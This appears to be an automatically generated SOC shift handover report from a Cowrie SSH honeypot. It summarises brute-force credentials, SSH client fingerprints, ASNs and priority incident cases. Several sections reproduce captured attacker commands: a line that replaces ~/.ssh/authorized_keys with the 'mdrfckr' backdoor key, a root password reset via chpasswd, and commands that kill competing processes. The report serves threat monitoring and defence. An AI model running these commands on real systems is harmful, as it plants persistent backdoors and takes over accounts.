# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-22 |
| **Generated At** | 2026-05-22T07:52:34Z |
| **Shift Time** | 07:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **255** |
| Confirmed Threats | **219** |
| False Positives Filtered | **36** (14.1%) |
| Unique Attacker IPs | **55** |
| Countries of Origin | **21** |
| High Severity Cases | **66** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **189** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **141** |
| Unique Credential Pairs | **80** |
| Unique Usernames | **43** |
| Unique Passwords | **71** |
| Successful Auth Pairs | **47** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 66 |
| `345gs5662d34` | 30 |
| `alex` | 2 |
| `user` | 2 |
| `ftpuser` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 32 |
| `345gs5662d34` | 30 |
| `123456` | 5 |
| `admin` | 3 |
| `1` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 32 |
| `345gs5662d34` | `345gs5662d34` | 30 |
| `admin` | `admin` | 2 |
| `root` | `welcome` | 1 |
| `alex` | `alex12345` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `welcome` | `183.91.11.36` | 2026-05-22T04:01:00 |
| `root` | `3245gs5662d34` | `183.91.11.36` | 2026-05-22T04:01:04 |
| `root` | `vps123` | `183.91.11.36` | 2026-05-22T04:09:58 |
| `root` | `qwer!@34` | `116.193.190.60` | 2026-05-22T04:13:13 |
| `root` | `3245gs5662d34` | `116.193.190.60` | 2026-05-22T04:13:18 |
| `root` | `admin2025!` | `116.193.190.60` | 2026-05-22T04:13:47 |
| `root` | `wang2025` | `116.193.190.60` | 2026-05-22T04:14:04 |
| `root` | `Lf123456@` | `116.193.190.60` | 2026-05-22T04:14:34 |
| `root` | `Aa112233.` | `116.193.190.60` | 2026-05-22T04:14:49 |
| `root` | `Superuser9!` | `116.193.190.60` | 2026-05-22T04:15:03 |
| `root` | `internet` | `116.193.190.60` | 2026-05-22T04:16:05 |
| `root` | `root123456789` | `165.154.105.128` | 2026-05-22T04:16:26 |
| `root` | `3245gs5662d34` | `165.154.105.128` | 2026-05-22T04:16:30 |
| `root` | `123@qwe` | `102.88.137.213` | 2026-05-22T04:25:16 |
| `root` | `3245gs5662d34` | `102.88.137.213` | 2026-05-22T04:25:22 |
| `root` | `test12345678` | `183.91.11.36` | 2026-05-22T04:27:39 |
| `root` | `changepassword` | `183.91.11.36` | 2026-05-22T04:32:08 |
| `root` | `Abc123456` | `180.76.184.79` | 2026-05-22T04:54:05 |
| `root` | `2wsx!QAZ` | `197.156.83.94` | 2026-05-22T05:03:24 |
| `root` | `3245gs5662d34` | `197.156.83.94` | 2026-05-22T05:03:28 |
| `root` | `administrator` | `40.81.224.201` | 2026-05-22T05:12:38 |
| `root` | `3245gs5662d34` | `40.81.224.203` | 2026-05-22T05:12:39 |
| `root` | `Qwer@1234` | `197.156.83.94` | 2026-05-22T05:14:58 |
| `root` | `A123123a` | `112.28.130.136` | 2026-05-22T05:15:54 |
| `root` | `Password@1234!` | `197.156.83.94` | 2026-05-22T05:18:59 |
| `root` | `Admin123*` | `73.36.177.174` | 2026-05-22T05:27:16 |
| `root` | `3245gs5662d34` | `73.36.177.174` | 2026-05-22T05:27:22 |
| `root` | `Abcd@123456` | `40.81.224.160` | 2026-05-22T05:28:38 |
| `root` | `3245gs5662d34` | `40.81.224.160` | 2026-05-22T05:28:39 |
| `root` | `root@123!` | `73.36.177.174` | 2026-05-22T05:30:54 |
| `root` | `Admin666` | `40.81.224.160` | 2026-05-22T05:32:40 |
| `root` | `3245gs5662d34` | `40.81.224.200` | 2026-05-22T05:32:41 |
| `root` | `Rr111111` | `197.156.83.94` | 2026-05-22T05:34:28 |
| `root` | `123qaz` | `40.81.224.203` | 2026-05-22T05:36:43 |
| `root` | `fa` | `40.81.224.201` | 2026-05-22T05:40:43 |
| `root` | `3245gs5662d34` | `40.81.224.201` | 2026-05-22T05:40:44 |
| `root` | `Pass@word1` | `40.81.224.200` | 2026-05-22T05:44:50 |
| `root` | `@Ww123456` | `197.156.83.94` | 2026-05-22T05:46:20 |
| `root` | `professor` | `197.156.83.94` | 2026-05-22T05:50:14 |
| `root` | `infinity@123` | `73.36.177.174` | 2026-05-22T05:54:56 |
| `root` | `asdASD123` | `40.81.224.203` | 2026-05-22T05:57:02 |
| `root` | `qwer.1234` | `8.222.249.206` | 2026-05-22T06:03:07 |
| `root` | `3245gs5662d34` | `8.222.249.206` | 2026-05-22T06:03:09 |
| `root` | `ubuntu` | `101.126.154.252` | 2026-05-22T06:17:39 |
| `root` | `3245gs5662d34` | `101.126.154.252` | 2026-05-22T06:17:54 |
| `root` | `Hello@1234` | `180.106.80.16` | 2026-05-22T06:51:37 |
| `root` | `3245gs5662d34` | `180.106.80.16` | 2026-05-22T06:51:45 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **255** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 183 |
| Go SSH scanner | 3 |
| OpenSSH | 3 |
| Unknown | 2 |
| Nmap scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 135 | 16 |
| `03a80b21afa8...` | Modern SSH client | 20 | 5 |
| `af8223ac9914...` | libssh-based | 17 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 135 | 16 | Mirai/variant |
| `03a80b21afa8...` | libssh | 20 | 5 | Modern SSH client |
| `af8223ac9914...` | libssh | 17 | 1 | libssh-based |
| `95420f9d932d...` | libssh | 10 | 7 | — |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `4e066189c3bb...` | Unknown | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 32 | 13 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:TFp11PifCTZy"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `112.28.130.136`, `180.76.184.79`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `73.36.177.174`, `40.81.224.160`, `183.91.11.36`, `102.88.137.213`, `40.81.224.203`, `180.106.80.16`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **55** |
| Unique ASNs | **35** |
| High-Risk ASNs | **24** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (66)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-799a384b1667

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-05-22 04:00 |
| **Last Seen** | 2026-05-22 04:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:00:59` | `cowrie.session.connect` |
| `2026-05-22 04:00:59` | `cowrie.client.version` |
| `2026-05-22 04:00:59` | `cowrie.client.kex` |
| `2026-05-22 04:01:00` | `cowrie.login.success` |
| `2026-05-22 04:01:00` | `cowrie.session.params` |
| `2026-05-22 04:01:00` | `cowrie.command.input` |
| `2026-05-22 04:01:00` | `cowrie.command.failed` |
| `2026-05-22 04:01:00` | `cowrie.log.closed` |
| `2026-05-22 04:01:01` | `cowrie.session.params` |
| `2026-05-22 04:01:01` | `cowrie.command.input` |
| `2026-05-22 04:01:01` | `cowrie.session.file_download` |
| `2026-05-22 04:01:01` | `cowrie.log.closed` |
| `2026-05-22 04:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc86c82f584f

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-05-22 04:01 |
| **Last Seen** | 2026-05-22 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:01:03` | `cowrie.session.connect` |
| `2026-05-22 04:01:03` | `cowrie.client.version` |
| `2026-05-22 04:01:04` | `cowrie.client.kex` |
| `2026-05-22 04:01:04` | `cowrie.login.success` |
| `2026-05-22 04:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae6bea224a49

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-05-22 04:09 |
| **Last Seen** | 2026-05-22 04:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:09:57` | `cowrie.session.connect` |
| `2026-05-22 04:09:57` | `cowrie.client.version` |
| `2026-05-22 04:09:58` | `cowrie.client.kex` |
| `2026-05-22 04:09:58` | `cowrie.login.success` |
| `2026-05-22 04:09:59` | `cowrie.session.params` |
| `2026-05-22 04:09:59` | `cowrie.command.input` |
| `2026-05-22 04:09:59` | `cowrie.command.failed` |
| `2026-05-22 04:09:59` | `cowrie.log.closed` |
| `2026-05-22 04:09:59` | `cowrie.session.params` |
| `2026-05-22 04:09:59` | `cowrie.command.input` |
| `2026-05-22 04:10:00` | `cowrie.session.file_download` |
| `2026-05-22 04:10:00` | `cowrie.log.closed` |
| `2026-05-22 04:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be8a96454437

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-05-22 04:10 |
| **Last Seen** | 2026-05-22 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:10:02` | `cowrie.session.connect` |
| `2026-05-22 04:10:02` | `cowrie.client.version` |
| `2026-05-22 04:10:02` | `cowrie.client.kex` |
| `2026-05-22 04:10:03` | `cowrie.login.success` |
| `2026-05-22 04:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-298610464000

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]60` |
| **First Seen** | 2026-05-22 04:13 |
| **Last Seen** | 2026-05-22 04:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:13:12` | `cowrie.session.connect` |
| `2026-05-22 04:13:12` | `cowrie.client.version` |
| `2026-05-22 04:13:12` | `cowrie.client.kex` |
| `2026-05-22 04:13:13` | `cowrie.login.success` |
| `2026-05-22 04:13:13` | `cowrie.session.params` |
| `2026-05-22 04:13:13` | `cowrie.command.input` |
| `2026-05-22 04:13:13` | `cowrie.command.failed` |
| `2026-05-22 04:13:14` | `cowrie.log.closed` |
| `2026-05-22 04:13:14` | `cowrie.session.params` |
| `2026-05-22 04:13:14` | `cowrie.command.input` |
| `2026-05-22 04:13:14` | `cowrie.session.file_download` |
| `2026-05-22 04:13:14` | `cowrie.log.closed` |
| `2026-05-22 04:13:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]60` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4e4dc0894a3

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]60` |
| **First Seen** | 2026-05-22 04:13 |
| **Last Seen** | 2026-05-22 04:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:13:17` | `cowrie.session.connect` |
| `2026-05-22 04:13:17` | `cowrie.client.version` |
| `2026-05-22 04:13:17` | `cowrie.client.kex` |
| `2026-05-22 04:13:18` | `cowrie.login.success` |
| `2026-05-22 04:13:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]60` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75be96343f18

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]60` |
| **First Seen** | 2026-05-22 04:13 |
| **Last Seen** | 2026-05-22 04:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:13:46` | `cowrie.session.connect` |
| `2026-05-22 04:13:46` | `cowrie.client.version` |
| `2026-05-22 04:13:46` | `cowrie.client.kex` |
| `2026-05-22 04:13:47` | `cowrie.login.success` |
| `2026-05-22 04:13:47` | `cowrie.session.params` |
| `2026-05-22 04:13:47` | `cowrie.command.input` |
| `2026-05-22 04:13:47` | `cowrie.command.failed` |
| `2026-05-22 04:13:48` | `cowrie.log.closed` |
| `2026-05-22 04:13:48` | `cowrie.session.params` |
| `2026-05-22 04:13:48` | `cowrie.command.input` |
| `2026-05-22 04:13:48` | `cowrie.session.file_download` |
| `2026-05-22 04:13:48` | `cowrie.log.closed` |
| `2026-05-22 04:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]60` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-839bf21b01e4

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]60` |
| **First Seen** | 2026-05-22 04:13 |
| **Last Seen** | 2026-05-22 04:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:13:51` | `cowrie.session.connect` |
| `2026-05-22 04:13:51` | `cowrie.client.version` |
| `2026-05-22 04:13:51` | `cowrie.client.kex` |
| `2026-05-22 04:13:52` | `cowrie.login.success` |
| `2026-05-22 04:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]60` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9e849408370

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]60` |
| **First Seen** | 2026-05-22 04:14 |
| **Last Seen** | 2026-05-22 04:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:14:03` | `cowrie.session.connect` |
| `2026-05-22 04:14:03` | `cowrie.client.version` |
| `2026-05-22 04:14:04` | `cowrie.client.kex` |
| `2026-05-22 04:14:04` | `cowrie.login.success` |
| `2026-05-22 04:14:05` | `cowrie.session.params` |
| `2026-05-22 04:14:05` | `cowrie.command.input` |
| `2026-05-22 04:14:05` | `cowrie.command.failed` |
| `2026-05-22 04:14:05` | `cowrie.log.closed` |
| `2026-05-22 04:14:05` | `cowrie.session.params` |
| `2026-05-22 04:14:05` | `cowrie.command.input` |
| `2026-05-22 04:14:06` | `cowrie.session.file_download` |
| `2026-05-22 04:14:06` | `cowrie.log.closed` |
| `2026-05-22 04:14:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]60` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40747fb2066b

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]60` |
| **First Seen** | 2026-05-22 04:14 |
| **Last Seen** | 2026-05-22 04:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:14:08` | `cowrie.session.connect` |
| `2026-05-22 04:14:08` | `cowrie.client.version` |
| `2026-05-22 04:14:08` | `cowrie.client.kex` |
| `2026-05-22 04:14:09` | `cowrie.login.success` |
| `2026-05-22 04:14:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]60` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-107de8de3da3

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]60` |
| **First Seen** | 2026-05-22 04:14 |
| **Last Seen** | 2026-05-22 04:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
